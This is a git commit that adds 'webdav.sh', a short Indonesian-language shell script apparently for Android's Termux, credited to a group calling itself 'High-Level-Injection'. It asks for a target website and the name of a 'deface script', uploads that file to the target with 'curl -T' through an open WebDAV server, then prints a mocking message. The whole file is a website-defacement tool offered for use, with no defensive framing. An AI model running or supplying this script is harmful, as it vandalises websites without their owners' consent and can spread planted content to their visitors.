2e2a96c4a650283b66461923a8ea61f2b3220825
nyazyad <63946603+nyazyad@users.noreply.github.com>
2020-04-19 17:35:25 +0800

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,12 @@
+clear
+cowsay -f eyes 'BY Zyad
+
+# PENCIPTA  : Zyad
+# TEAM      : High-Level-Injection
+# KONTAK    : c7k.zyad@gmail.com' | 
+
+
+read -p " website si target ==> " target
+read -p " nama sript deface klean ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] anjy kena prank:v"
